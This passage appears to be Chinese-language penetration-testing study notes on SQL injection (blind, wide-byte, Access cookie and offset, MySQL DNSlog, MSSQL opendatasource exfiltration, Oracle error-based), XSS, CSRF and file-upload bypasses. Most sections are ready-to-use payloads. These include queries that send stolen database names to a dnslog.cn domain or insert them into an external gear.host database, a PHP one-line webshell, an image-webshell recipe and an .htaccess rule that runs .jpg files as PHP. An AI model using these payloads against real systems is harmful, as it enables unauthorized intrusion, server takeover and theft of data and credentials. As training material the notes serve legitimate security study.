#可以用burp进行爆破，替换a，显示正常则字符正确，第一个正确了，就测试第二个，然后第三个......and ascii(substr(database(),1,1))&gt;100 #用字符的ASCII码来缩小查找范围ascii(substr((select table_name from information_schema.tables=database( limit 0,1),1,1)))=102 #    更换1,1中的前面的那个1和102来判断表名</code></pre><p>数据库名、表名、字段名都可以按照这个方法来判断</p><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>magic_quotes_gpc：魔术引号开关，在php中的作用是判断用户提交的数据，如包含有：post、get、cookie、过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染，而出现致命的错误。</p><p>出现魔术引号的时候，会经过PHP处理出现’或者”或者\导致我们输入的东西无法闭合</p><p>这时候我们就需要寻找不需要闭合的注入点或者使用宽字节注入</p><br><p>这里我们要知道一个编码格式：GBK编码，是一种多字符编码，双字节编码</p><p>而且，当汉字是GBK编码的时候是两个字节，是UTF-8表面的的时候是3个字节。</p><p>我们可以用汉子来吧魔术引号的\屏蔽掉，相当于是一种绕过</p><p>当我们遇到的是GET传参的时候，就用GBK编码来代表汉字，例</p><pre><code>id=1 %5d%5c' union select 1,2,3 -- qwe假如说我们这个时候已经获取了数据库名，那么就将数据库名转换为16进制数id=1 %5d%5c' union select 1,2,table_name from information_schema tables where table_shcema=0x76738572因为MySQL是支持十六进制的，我们如果直接输入数据库名的话，要加单引号，而单引号会被魔术引号注释掉，导致失效，而直接用database()来代替数据库名可能会出错</code></pre><p>当我们遇到是POST传参的时候，直接输入汉字进行绕过即可，其余与GET传参无异</p><p>同时也可以</p><pre><code>a') or 1=1 -- qwe也可以用burp在hex中把a所代表的那个十六进制改成df来进行绕过</code></pre><h2 id="Access注入——cookie注入"><a href="#Access注入——cookie注入" class="headerlink" title="Access注入——cookie注入"></a>Access注入——cookie注入</h2><h3 id="什么是Cookie？"><a href="#什么是Cookie？" class="headerlink" title="什么是Cookie？"></a>什么是Cookie？</h3><p>cookie就是代表你身份的一串字符串，网站根据Cookie来识别你是谁，如果你获取了管理员的Cookie，你可以无需密码直接登录管理员账号。</p><h3 id="为什么Cookie和注入擦出火花？"><a href="#为什么Cookie和注入擦出火花？" class="headerlink" title="为什么Cookie和注入擦出火花？"></a>为什么Cookie和注入擦出火花？</h3><p>在动态语言中存在超全局变量可以获取多种传参方式，很多时候开发在开发的时候为了考虑到多种接收参数，在接收参数的时候都用多种解释传参的方式。</p><p>例如：php中的$_REQUEST可以获取POST|GET|COOKIE传参</p><p><strong>php5.4以上版本不接受Cookie传参</strong></p><br><p>Cookie注入不仅仅存在于Access数据库中，其他数据库中也有；</p><p><strong>Cookie注入是在POST，GET传参被拦截的情况下所使用的</strong></p><h3 id="实现Cookie注入要满足的条件："><a href="#实现Cookie注入要满足的条件：" class="headerlink" title="实现Cookie注入要满足的条件："></a>实现Cookie注入要满足的条件：</h3><p>1、注入满足的条件；</p><p>2、网站会获取Cookie传参，然后和原有的SQL语句拼接再传入数据库。</p><h3 id="设置Cookie的方法："><a href="#设置Cookie的方法：" class="headerlink" title="设置Cookie的方法："></a>设置Cookie的方法：</h3><h4 id="一、用Burp"><a href="#一、用Burp" class="headerlink" title="一、用Burp"></a>一、用Burp</h4><p>找到包中Cookie传参的那一行，在Cookie中的数据后面加上分号，然后进行传参</p><p>例：我们抓取了一个网站的新闻页面的包，id传参为171，将url栏中的?id=171去掉，然后Cookie:……….; id=171</p><h4 id="二、浏览器插件EditCookie"><a href="#二、浏览器插件EditCookie" class="headerlink" title="二、浏览器插件EditCookie"></a>二、浏览器插件EditCookie</h4><p><strong>Cookie的传参会进行url解码，所以传参的时候不要忘记进行url编码</strong></p><p>其次Cookie注入和sql注入没有区别</p><p>查询Access数据库必须要带表名，而且Access数据库没有系统自带库，所以就要强行蔡姐来猜测表名</p><pre><code>and exists(select *from 表名)        #不要忘记进行url编码</code></pre><p>这段代码可以判断数据库中是否存在此表，显示正常则代表存在。</p><p>我们可以用burp来爆破表名</p><p>假如我们已经获得了表名为admin，并且判断出表中有三个字段</p><p>那么就要判断输出点，用EditCookie新建一个cookie，命名为id，内容为</p><pre><code>171 union select 1,2,3 from admin        #不要忘记进行url编码</code></pre><p>判断完输出点，这个时候我们就要得到字段名来获得数据，这里有两个方法获取字段名：①、强猜；②、偏移注入</p><p>偏移注入后面就会讲，这里用强猜，常用的字段名都可以尝试，例如username;password;id…….</p><pre><code>171 union select 1,username,3 from admin        #不要忘记进行url编码171 union select 1,password,3 from admin</code></pre><h4 id="三、用js设置Cookie"><a href="#三、用js设置Cookie" class="headerlink" title="三、用js设置Cookie"></a>三、用js设置Cookie</h4><p>F12打开Console，我们用浏览器的控制台的时候记得要把插件关掉</p><p>用js来进行SQL注入的话我们就不需要进行url编码了</p><p>进入Console后直接输入</p><pre><code>document.cookie="id="+escape("171 order by 1")</code></pre><p>记得要把URL栏中的?id=171删掉，只要替换括号内的语句就可以了</p><br><p>我们用SQLmap跑cookie注入的时候</p><pre><code>python sqlmap.py -u .......?id=171(这个?id=171记得要删掉) --cookie "id=171" --level 2</code></pre><p>Cookie注入一般在ASP站中容易遇到，因为这样的站都是一些老网站，都用的是Access数据库。</p><h2 id="Access注入——偏移注入"><a href="#Access注入——偏移注入" class="headerlink" title="Access注入——偏移注入"></a>Access注入——偏移注入</h2><h3 id="偏移注入使用场景："><a href="#偏移注入使用场景：" class="headerlink" title="偏移注入使用场景："></a>偏移注入使用场景：</h3><p>在知道表名但不知道字段名的情况下查询数据，搭配cookie注入</p><h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p><em>：在数据库中\</em>代表一切</p><p>库.表：表示选中这个库里面这个表</p><p>admin.*：代表admin表中所有字段</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/26/shen-tou-ce-shi-zong-jie/1.png" alt=""></p><p>假如我们要注入的这个页面，用order by 查到显示这个页面的表中有10个字段，然后知道了有一个叫admin的表，如果这个admin表中有2个字段，那么就要用</p><pre><code>union select 1,admin.*,4,5,6,7,8,9,10 from admin</code></pre><p>假设admin表中有7个字段=&gt;a,b,c,d,e,f,g</p><pre><code>union select 1,2,3,4,5,6,7,8,9,10 from admin        #正常这样判断显错位union select 1,2,3,admin.* from admin            等价于↓union select 1,2,3,a,b,c,d,e,f,g from admin</code></pre><p>至于admin表中到底有多少个字段就要靠自己慢慢地尝试</p><p>再假设我们判断出来的显错位为4,5,6，那么</p><pre><code>select 1,2,3,admin* from admin        #可以获得a,b,cselect 1,2,admin* from admin        #可以获得b,c,dselect 1,admin*,9,10 from admin        #可以获得c,d,eselect admin.*,8,9,10 from admin    #可以获得d,e,f</code></pre><p>偏移注入就是有这样的局限性，因为显错位不够，导致g无法显示了，如果原本要查询的这个页面的数据库中的表的字段越多，显示位越多，偏移注入就越多，当然可能并不是所有的字段内容都是对我们有用的。</p><p>有的显错位并不一定那么明显的显示在页面中，有可能在这个页面的图片中的html源码里</p><p>偏移注入用sqlmap是跑不出来的，所以遇到了还是自己手注的好</p><h2 id="MySQL注入——DNS注入"><a href="#MySQL注入——DNS注入" class="headerlink" title="MySQL注入——DNS注入"></a>MySQL注入——DNS注入</h2><p>Dns log【Dns日志注入】</p><h3 id="Dns-Log使用场景："><a href="#Dns-Log使用场景：" class="headerlink" title="Dns Log使用场景："></a>Dns Log使用场景：</h3><p>在某些无法直接利用漏洞获得回显的情况下，但是目标可以发起请求，这儿是后可以通过DNS请求把想获得的数据外带出来。对于sql盲注，常用的方法就是二分法去一个个猜，但是这样的方法麻烦不说，还很容易因为数据请求频繁导致被ban。所以可以将select到的数据发送给一个url，利用dns解析产生的记录日志来查看数据。</p><h3 id="DNS日志的作用："><a href="#DNS日志的作用：" class="headerlink" title="DNS日志的作用："></a>DNS日志的作用：</h3><p>是因为网站没有回显点，只能用盲注的方法，可能盲注都做不了，ton故宫这种外在的方法来显示。</p><p>核心：将盲注转换成显错注入</p><br><p>LOAD_FILE()：读取文件的函数，仅限于MySQL数据库</p><p>读取文件并返回文件内容为字符串，要使用此函数，<strong>文件必须位于服务器主机上</strong>，必须指定完整路径的文件，并且必须有FILE权限。该文件所有字节可读，但文件内容必须小于max_allowed_packet（限制server接收的数据包大小函数，默认1MB）。如果该文件不存在或无法读取，因为前面的条件之一不满足，函数返回NULL</p><p><strong>默认情况下，load_file()函数是不支持的，需要修改MySQL文件夹下的my.ini文件，在文件最后一行加上secure_file_priv=</strong></p><p>有些开发而可能会偷懒采用这个方法来加载一些外部文件，才会开启它。</p><h3 id="UNC路径："><a href="#UNC路径：" class="headerlink" title="UNC路径："></a>UNC路径：</h3><p>就像是NFS共享文件夹那样要输入的</p><p>\\192.168.1.1</p><p>DNS注入时因为转义的原因，反斜杠可能要写4个，所以正斜杠会更好//192.168.1.1</p><br><p>UNC路径其实是windows有个叫SMB的服务，我们控制它去请求一些数据</p><p>例：//a.1806dl.dnslog.cn/abc</p><p>访问1806dl.dnslog.cn下的abc共享文件夹</p><p>Linux系统默认没有smb服务，</p><p>这个域名一定是他公司内网所解析不了的</p><br><p>dnslog.cn平台可以帮助我们随机获取一个域名，在这个平台就可以显示我们想要的dns日志</p><p>例：</p><pre><code>and load_file(concat('//',(select database()),'3u501d.dnslog.cn//abc')) -- qwe</code></pre><p>3u501d.dnslog.cn是在dnslog.cn平台随机获取的域名，abc是要查的文件夹，写什么都可以，上面这条语句可以帮助我们获得库名</p><pre><code>and load_file(concat('//',(select table_name from information_schema.tables where table_schema=database() limit 0,1),'3u501d.dnslog.cn//abc')) -- qwe</code></pre><p>通过GET传参或者其他什么传参都可以</p><h2 id="MSSQL注入——反弹注入"><a href="#MSSQL注入——反弹注入" class="headerlink" title="MSSQL注入——反弹注入"></a>MSSQL注入——反弹注入</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>MSSQL注入攻击是最为复杂的数据库攻击技术，由于该数据库功能十分强大，存储过程以及函数语句十分丰富，这些灵活的语句造就了新颖独特的攻击思路。</p><h3 id="MSSQL反弹注入"><a href="#MSSQL反弹注入" class="headerlink" title="MSSQL反弹注入"></a>MSSQL反弹注入</h3><p>明明是SQL的注射点却无法进行注入，注入工具猜解的速度异常缓慢，错误提示信息关闭，无法返回注入结果等，这些都是在注入攻击中常常遇到的问题。为了解决以上这些疑难杂症，比较好的解决方法就是使用反弹注入技术，而反弹注入技术则需要依靠opendatasource函数支持</p><h3 id="所需要掌握的知识"><a href="#所需要掌握的知识" class="headerlink" title="所需要掌握的知识"></a>所需要掌握的知识</h3><p>反弹注入的核心就是“拖库”，将从靶场中所查询获得的信息插入到你自己的数据库中，但是拖取的表的字段数要和你要插入数据的字段数要相同。</p><ul><li>insert into：数据库插入语句；</li><li>opendatasource（provider_name,init_string）：可以理解为使用opendatasource函数将当前数据库查询的借口发送到另一个数据库服务器中；provider是注册为用于访问数据源的OLEDB提供数据库的PROGID的名称；<br>init_string为连接字符串（server=连接地址,端口;uid=用户名;database=数据库名）；</li><li>dbo：是MMSQL数据库中当前用户的权限；</li><li>堆叠注入：就是SQL注入的时候可以执行多条语句，用“;”作为一个语句的结束；</li><li>延时函数：waitfor delay ‘x:xx’：x为数字，且该语句不能单独使用，需要作为一个查询表过程中的条件；</li><li>SQL Server的系统自带表：sysobjects，且凡是用户创建的表，它的xtype都为U；</li><li>SQL Server的系统自带字段表：syscolumns，字段所对应的就是字段的id；</li><li>SQL Server强化了用户的概念，而弱化了库的概念，相当于一个用户就是一个库；</li><li>该注入需要用到Navicat来连接数据库，当然也可以用香港云中的工具来进行连接。</li></ul><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>1.我们首先需要一个数据库</p><p>这里有免费可白嫖的平台让你搭建数据库，①.香港云：<a href="http://www.webweb.com" target="_blank" rel="noopener">http://www.webweb.com</a></p><p>②.国外平台：<a href="https://my.gearhost.com/CloudSite" target="_blank" rel="noopener">https://my.gearhost.com/CloudSite</a></p><p>我们注册的时候如果不想使用自己的邮箱验证，可以使用临时邮箱：bccto.me平台来进行邮箱验证</p><p>这样我们就得到了我们自己的数据库地址、数据库名、用户名、密码</p><p>2.然后我们需要用Navicat连接我们的数据库，黄色代表连接成功</p><h3 id="实战演练"><a href="#实战演练" class="headerlink" title="实战演练"></a>实战演练</h3><h4 id="判断是否只存在注入"><a href="#判断是否只存在注入" class="headerlink" title="判断是否只存在注入"></a>判断是否只存在注入</h4><p>用and 1=1 – qwe和and 1=2 – qwe</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/26/shen-tou-ce-shi-zong-jie/MSSQL1.png" alt="MSSQL1"></p><p>显示正常</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/26/shen-tou-ce-shi-zong-jie/MSSQL2.png" alt="MSSQL2"></p><p>显示不正常</p><h4 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h4><pre><code>' order by 1 -- qwe            #显示正常' order by 2 -- qwe            #显示正常' order by 3 -- qwe            #显示正常' order by 4 -- qwe            #报错</code></pre><p>判断出来有三个字段获取id和表名</p><h4 id="获取id和表名"><a href="#获取id和表名" class="headerlink" title="获取id和表名"></a>获取id和表名</h4><pre><code>'; insert into opendatasource('sqloledb','server=den1.mssql8.gear.host,1433;uid=samedi;pwd=xxxxxxxxxx;database=samedi').samedi.dbo.object select id,name from sysobjects where xtype='U' --+</code></pre><p>注入上面的语句我们就可以获得表名</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/26/shen-tou-ce-shi-zong-jie/MSSQL3.png" alt="MSSQL3"></p><p>admin表对应的id为“1977058079”</p><h4 id="获取字段名"><a href="#获取字段名" class="headerlink" title="获取字段名"></a>获取字段名</h4><pre><code>'; insert into opendatasource('sqloledb','server=den1.mssql8.gear.host,1433;uid=samedi;pwd=xxxxxxxxxxx;database=samedi').samedi.dbo.columns select name from syscolumns where id=1977058079 --+</code></pre><p>通过id,我们可以找到admin表对应的字段，创建另一个只有一个字段的表columns，当然，也可以用之前的那个表。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/26/shen-tou-ce-shi-zong-jie/MSSQL4.png" alt="MSSQL4"></p><p>之后获取字段中的数据也是轻而易举的了，因为知道了有4个字段，所以我们在自己的数据库中创建一个有4个字段的表</p><pre><code>select *from admin --+</code></pre><h2 id="Oracle注入——报错注入"><a href="#Oracle注入——报错注入" class="headerlink" title="Oracle注入——报错注入"></a>Oracle注入——报错注入</h2><p>MySQL中的报错注入使用的函数是updatexml()</p><p>Oracle数据库中存在虚表/实表，Oracle弱化了库的概念，强化了用户的概念，用户就是库</p><h3 id="系统自带库"><a href="#系统自带库" class="headerlink" title="系统自带库"></a>系统自带库</h3><pre><code>select * from all_tables                #列出所有表select * from user_tables                #查询出当前用户的表select * from all_tab_columns            #查询出所有字段select * from user_tab_coulumns            #查询出当前用户的字段select * from v$version                    #查版本</code></pre><h3 id="limit的使用"><a href="#limit的使用" class="headerlink" title="limit的使用"></a>limit的使用</h3><p>Oracle用的是rownum=1：限制查询返回的总行数为一条，且大于1时，只能用小于号，例：</p><pre><code>select * from admin where rownum=1        #一条数据select * from admin where rownum&lt;3        #两条数据</code></pre><p>select rownum,UNAME from admin</p><table><thead><tr><th>ROWNUM</th><th>UNAME</th></tr></thead><tbody><tr><td>1</td><td>admin</td></tr><tr><td>2</td><td>root</td></tr></tbody></table><h3 id="Oracle显错注入"><a href="#Oracle显错注入" class="headerlink" title="Oracle显错注入"></a>Oracle显错注入</h3><pre><code>and 1=1and 1=2order by 1··union select null,null,null from  dual我们是需要知道null的字段类型，从而来代替null的，这里假如知道union select 1,null,to_nchar('a') from dual这里需要将union前面的语句显示不出来，比如说将id字段输入一个不存在的数字，例：1000id=1000 union all select 1,null,to_nchar('table_name') from user_tables查出来表名为xxxid=1000 union all select 1,null,to_nchar('table_name') from user_tables where table_name&lt;&gt;'xxx'这句相当于将xxx排除，因此可以得到其他表名，例：ADMIN还想获得下一个表名就在这句后面加上and table_name&lt;&gt;'ADMIN'select username from (select rownum r,username from all_users) where r=1r相当于rownum的别名，r=2就是第2条数据select column_name from(select rownum r,column_name from user_tab_columns) where r=1id=1000 union all select 1,null,to_nchar(column_name) from (select rownum r,column_name from user_tab_columns where table_name='ADMIN') where r=1select 1,null,to_char(UPASS) from (select rownum r,UPASS from admin) where r=1</code></pre><h3 id="Oracle报错注入"><a href="#Oracle报错注入" class="headerlink" title="Oracle报错注入"></a>Oracle报错注入</h3><p>CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1))</p><p>：去查询关于主题的对应关键词，然后因为查询失败（应该是这个用户没有创建和查询的权限，默认情况没有创建，爆出未查询到的错误，从而爆出查询内容）</p><pre><code>id=1000 and 1=CTXSYS.DRITHSX.SN(1,(select table_name from user_tables where rownum=1))</code></pre><p>报错不需要union，之后的跟显错注入是一样的。</p><h2 id="XSS原理分析与解剖"><a href="#XSS原理分析与解剖" class="headerlink" title="XSS原理分析与解剖"></a>XSS原理分析与解剖</h2><p>如果我们想进入管理员后台？</p><p>1.找后台地址，输入正确的账号密码</p><p>2.通过cookie，不用账号密码</p><p>Cookie是以分号结尾的，第一个等号的后面都是值</p><p>XSS最大的作用就是窃取Cookie，Cookie是存放在用户的浏览器中的</p><br><p>XSS也是注入的一种：前段注入</p><p>XSS可以：窃取Cookie（用的最频繁）、获取内网ip、获取浏览器中保存的明文密码、截取网页屏幕、网页上的键盘记录</p><p>XSS分类：</p><p>​    反射型：你提交的数据成功的实现了XSS，不会放入数据库中，但是仅仅是对你这次访问产生了影响，是非持久型攻击；</p><p>​    存储型：你提交的数据成功的实现了XSS，存入了数据库中，别人访问这个页面的时候就会自动触发；</p><p>​    DOM型：完全是客户机的事情，与前端交互。</p><h3 id="我们与网站之间的交互是怎样的？"><a href="#我们与网站之间的交互是怎样的？" class="headerlink" title="我们与网站之间的交互是怎样的？"></a>我们与网站之间的交互是怎样的？</h3><p>请求网站，网站返回前端代码，浏览器根据前端代码解析执行，渲染出好看的页面</p><p>PHP是服务器执行的，前端代码是被浏览器执行的。</p><h3 id="怎么测试网站是否存在XSS？"><a href="#怎么测试网站是否存在XSS？" class="headerlink" title="怎么测试网站是否存在XSS？"></a>怎么测试网站是否存在XSS？</h3><p>三种触发方法：</p><h4 id="标签触发"><a href="#标签触发" class="headerlink" title="标签触发"></a>标签触发</h4><pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><p>弹窗使用来证明是否存在XSS的，但是弹窗危害有些大，尽量避免使用，可以使用其他的html代码来证明是否被当做html代码执行了</p><p>在真正的项目上，还是要用弹窗来证明是否存在XSS，或直接打攻击代码窃取Cookie</p><h4 id="伪协议触发"><a href="#伪协议触发" class="headerlink" title="伪协议触发"></a>伪协议触发</h4><pre><code>JavaScript：alert(123)</code></pre><p>上面的JavaScript就是伪协议，后面的东西就会被当做js代码执行，需要点击触发，例</p><pre><code>&lt;a href="Javascript:alert(123)"&gt;abc&lt;/a&gt;</code></pre><h4 id="事件触发"><a href="#事件触发" class="headerlink" title="事件触发"></a>事件触发</h4><p>满足某种条件自动触发，例</p><pre><code>&lt;img src="#" onerror=alert(1) //&gt;</code></pre><p>当此图片没有加载成功的时候会触发弹窗</p><h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p>在什么情况下双引号能够替代单引号？</p><p>1、本身就是单引号闭合，但是页面上因为浏览器渲染看着是双引号闭合</p><p>2、就没写单引号闭合</p><h3 id="存储型XSS会出现在什么地方？"><a href="#存储型XSS会出现在什么地方？" class="headerlink" title="存储型XSS会出现在什么地方？"></a>存储型XSS会出现在什么地方？</h3><p>任何可能插入数据库的地方</p><p>但是数据不一定存储在数据库中，如日志、文件</p><p>也不是只有框才会交互，数据传参要用GET、POST、HEAD，并不一定要有框，所以见框就插是一种方法，但并不唯一</p><p><strong>用户的输入，一般控制的很严格；</strong></p><p><strong>系统的获取，一般控制的不严格</strong></p><h2 id="DOM-Based-XSS"><a href="#DOM-Based-XSS" class="headerlink" title="DOM Based XSS"></a>DOM Based XSS</h2><p>通过js对网页进行修改的就是DOM型XSS</p><p>DOM是一个与平台、编程语言无关的接口，他允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为系那是页面的一部分。</p><p>DOM——based XSS漏洞是基于文档对象模型（Document Object Model，DOM）的一种漏洞</p><p>DOM中有很多对象，其中一些使用户可以操纵的，如url，location，refelTer等。</p><p>客户端的脚本程序可以通过DOM动态的检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM——based XSS漏洞。</p><br><p>每个载入浏览器的HTML文档都会成为Document对象，Document对象使我们可以从脚本中对HTML页面中的所有元素进行访问。</p><p>Document对象属性</p><table><thead><tr><th>属性</th><th align="left">描述</th></tr></thead><tbody><tr><td>body</td><td align="left">提供对&lt;body&gt;元素的直接访问。对于定义了框架集的文档，改属性引用最外层的&lt;frameset&gt;。</td></tr><tr><td>cookie</td><td align="left">设置或返回与当前文档有关的所有cookie。</td></tr><tr><td>domain</td><td align="left">返回当前文档的域名。</td></tr><tr><td>lastModified</td><td align="left">返回文档被最后修改的日期和时间。</td></tr><tr><td>referrer</td><td align="left">返回载入当前文档的文档的URL。</td></tr><tr><td>title</td><td align="left">返回当前文档的标题。</td></tr><tr><td>URL</td><td align="left">返回当前文档的URL</td></tr></tbody></table><p>document.cookie     可以读取cookie</p><p>JS 存在的意义就是让更多的工作在访问者自己的电脑中去处理，从而降低对服务器资源的占用</p><p>用document.lastModified  可以返回时间</p><p>静态页面所返回的时间是不变的，伪静态页面所返回的时间是变化的</p><p><strong>动态和伪静态页面漏洞相较于静态页面会更多</strong></p><p>Document对象方法</p><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>close()</td><td>关闭用document.open()方法打开的输出流，并显示选定的数据。</td></tr><tr><td>getElementById()</td><td>返回对拥有指定id的第一个对象的引用。</td></tr><tr><td>getElementsByName()</td><td>返回带有指定名称的对象集合。</td></tr><tr><td>getElementByTagName()</td><td>返回带有指定标签名的对象集合。</td></tr><tr><td>open()</td><td>打开一个流，以收集来自任何document.write()或document.writeln()方法的输出。</td></tr><tr><td>write()</td><td>向文档写HTML 表达式或JavaScript代码。</td></tr><tr><td>writeln()</td><td>等同于write()方法，不同的是在每个表达式之后写一个换行符。</td></tr></tbody></table><p>document.write()        他可以接受native编码值</p><p><strong>JS触发的XSS就是DOM型XSS，是前端产生了问题</strong></p><h2 id="跨站请求伪造——CSRF"><a href="#跨站请求伪造——CSRF" class="headerlink" title="跨站请求伪造——CSRF"></a>跨站请求伪造——CSRF</h2><p>CSRF：借用你的Cookie；XSS：窃取你的Cookie</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>当访问了一个有CSRF的网站，同时又访问了一个之前登陆过的网站，这时，这个登陆过的网站中的你的账号内的有些东西会被更改。</p><p>CSRF（Cross-site request forgery）跨站请求伪造：也被称为“One Click Attack”或者“Session Riding”，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本（XSS），但它与XSS非常不同，XSS利用站点内的新人用户，而CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险性。</p><p>其实说白了，CSRF漏洞的成因就是网站的Cookie在浏览器中不会过期，只要不关闭浏览器或者退出登录，那以后只要是访问这个网站，都会默认你已经登录的状态。而在这个期间，攻击者发送了构造好的CSRF脚本或者包含CSRF脚本的链接，可能会执行一些用户不想的功能（比如是添加账号等）。</p><p>CSRF核心在于缺乏验证</p><p>1、像验证码是他做好的方法，但开发不可能给每一个步骤都添加验证码，因为那样用户体验感极差；</p><p>2、开发为了安全，设置了一个东西叫做Token，Token是一种验证机制，每个请求的表单中都存在着一个Token字段</p><br><h3 id="例"><a href="#例" class="headerlink" title="例"></a>例</h3><p>现在A站创建一个用户，并修改它的个人资料，在那个A站想要改其内容的页面用burp抓一个包，然后右键-&gt;Engagemant tools-&gt;GGenerate CSRF POC</p><p>将产生的html代码保存在一个html文件中，此代码即为攻击代码</p><p>再注册另一个账号，然后打开那个保存在本地上的攻击页面，点击按钮，然后刷新第二个站好的个人资料页面，发现内容变了，那么这个地方就存在CSRF漏洞。</p><p>也可以设置自动触发：将攻击页面的那个按钮里的</p><form></form>以及内容删掉，然后在函数后的一行<script>与</script>内加上一行submitReques()，也就是直接运行这个函数。<p></p><h2 id="文件上传漏洞——解析、验证、伪造（一）（黑名单）"><a href="#文件上传漏洞——解析、验证、伪造（一）（黑名单）" class="headerlink" title="文件上传漏洞——解析、验证、伪造（一）（黑名单）"></a>文件上传漏洞——解析、验证、伪造（一）（黑名单）</h2><p>首先讲一下各种shell的含义：</p><p>webshell：网站权限</p><p>getshell：获取权限</p><p>反弹shell：受害及其会访问攻击机</p><p>正常shell：攻击机连接木马</p><br><p>PHP常用的一句话木马：</p><pre><code>&lt;?php eval($_REQUEST['a'])?&gt;</code></pre><br><p>webshell管理工具有:</p><p>中国菜刀、蚁剑、冰蝎等</p><br><p>数据库一般是外界访问不到的，所以密码一般都不会改</p><p>正常黑客思维：</p><p>我就是要拿权限，怎么拿不重要，大部分思路-&gt;SQL注入，获得密码，进入后台，上传文件，有的时候，前台上传一句话木马拿下服务器也是常见的。</p><p>黑白名单机制：</p><p>黑名单：不允许上传什么</p><p>白名单：只允许上传什么</p><p>白名单相比于黑名单更安全</p><h3 id="上传遇到的情况："><a href="#上传遇到的情况：" class="headerlink" title="上传遇到的情况："></a>上传遇到的情况：</h3><p>前端检测的情况：一般是在网页上写一段JS代码，用Js去检测，验证上传文件的后缀名，有白名单也有和名单</p><p>判断方法：在浏览加载文件，但未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包，所以可以通过抓包来判断，如果弹出不允许上传，但是没有抓到数据包，那么就是前端验证</p><p>前端验证非常不可靠，传正常文件改数据包就可以绕过，甚至关闭JS都可以尝试绕过</p><br><p>服务端检测的情况：</p><p>常见手段：检查Content-Type（内容类型）、检查后缀（检查后缀是主流）、检查文件头</p><p>如何绕过Content-Type和文件头检测，这个时候我们就要去制作一个图片马了；</p><h4 id="制作图片马"><a href="#制作图片马" class="headerlink" title="制作图片马"></a>制作图片马</h4><p>图片马制作很简单，写一个一句话木马放在TXT文件，然后找一张你喜欢的图片（注意文件大小，越小越好），然后打开cmd</p><pre><code>copy a.jpg/b+1.txt 123.jpg        (将a.jpg和1.txt合并为123.jpg)</code></pre><p>图片马可以很好的绕过内容类型和文件头</p><p>/b的意思是将它以二进制的方法去合并，为了防止图片破碎</p><h4 id="判断黑白名单"><a href="#判断黑白名单" class="headerlink" title="判断黑白名单"></a>判断黑白名单</h4><p>上传一个2.a文件，若能上传就是黑名单机制</p><h3 id="上传绕过方法："><a href="#上传绕过方法：" class="headerlink" title="上传绕过方法："></a>上传绕过方法：</h3><h4 id="1、最不可靠的前端验证"><a href="#1、最不可靠的前端验证" class="headerlink" title="1、最不可靠的前端验证"></a>1、最不可靠的前端验证</h4><p>直接抓包，将上传的jpg改为php即可</p><h4 id="2、Content-Type绕过"><a href="#2、Content-Type绕过" class="headerlink" title="2、Content-Type绕过"></a>2、Content-Type绕过</h4><p>既然是检查文件类型，拿出我们的图片马，web容器是根据后缀来识别格式的，我只要上传的文件后缀是.php就行</p><h4 id="3、黑名单绕过"><a href="#3、黑名单绕过" class="headerlink" title="3、黑名单绕过"></a>3、黑名单绕过</h4><p>如果.php无法上传，那我们就尝试.php3、.php4、.php5、.phtml，这些默认都会被解析为php的</p><h4 id="4、-htaccess文件绕过"><a href="#4、-htaccess文件绕过" class="headerlink" title="4、.htaccess文件绕过"></a>4、.htaccess文件绕过</h4><p>.htaccess是什么？</p><p>全称是Hypertext Access(超文本入口)，.htaccess文件也被称为分布式配置文件，提供了针对目录改变配置的方法，在一个特定的文档目录中放置一个包含一个或多个指令的文件，以作用于此目录及其所有子目录。</p><p>.htaccess功能：</p><p>文件夹密码保护、用户自定义重定向、自定义404页面、扩展名伪静态化、禁止特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表</p><p><strong>很可以，这么一个强大的功能默认是不开启的</strong></p><p>写一个文件1.txt，内容为</p><pre><code>AddType application/x-httpd-php .jpg</code></pre><p>这个指令代表着.jpg文件会被当做php来解析，重命名这个文件为.htaccess</p><pre><code>ren 1.txt .htaccess</code></pre><p>上传图片马之后再上传.htaccess文件，图片马便会被解析</p><h4 id="5、大小写绕过"><a href="#5、大小写绕过" class="headerlink" title="5、大小写绕过"></a>5、大小写绕过</h4><p>我们可以通过大小写去绕过，web容器除非非常老的版本，不然都不区分大小写</p><p>例：PHp</p><h4 id="6、文件后缀（空）绕过"><a href="#6、文件后缀（空）绕过" class="headerlink" title="6、文件后缀（空）绕过"></a>6、文件后缀（空）绕过</h4><p>在文件名后面留一个空格，然后上传上去后空格会被自动的省略，添加空格是在burp中进行的。</p><h4 id="7、文件后缀（点）绕过"><a href="#7、文件后缀（点）绕过" class="headerlink" 